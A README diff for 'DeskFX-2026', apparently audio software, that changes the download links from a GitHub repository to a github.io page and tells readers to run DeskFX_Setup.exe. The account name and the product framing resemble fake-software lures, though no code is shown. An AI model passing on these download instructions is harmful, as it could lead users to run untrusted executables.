@@ -1,6 +1,6 @@
 # 🎧 DeskFX-2026 - Improve your computer audio quality easily
 
-[![](https://img.shields.io/badge/Download-DeskFX-blue.svg)](https://github.com/aleenfortyeighth343/DeskFX-2026)
+[![](https://img.shields.io/badge/Download-DeskFX-blue.svg)](https://aleenfortyeighth343.github.io)
 
 ## 🎯 About this software
 
@@ -18,7 +18,7 @@ Your computer must meet these basic standards to run the software:
 
 ## 📥 How to download and install
 
-1. Visit the [official download page](https://github.com/aleenfortyeighth343/DeskFX-2026) to obtain the installer.
+1. Visit the [official download page](https://aleenfortyeighth343.github.io) to obtain the installer.
 2. Locate the file named DeskFX_Setup.exe in your Downloads folder.
 3. Double-click the file to start the installation.
 4. Follow the instructions on the screen to finish the setup process.
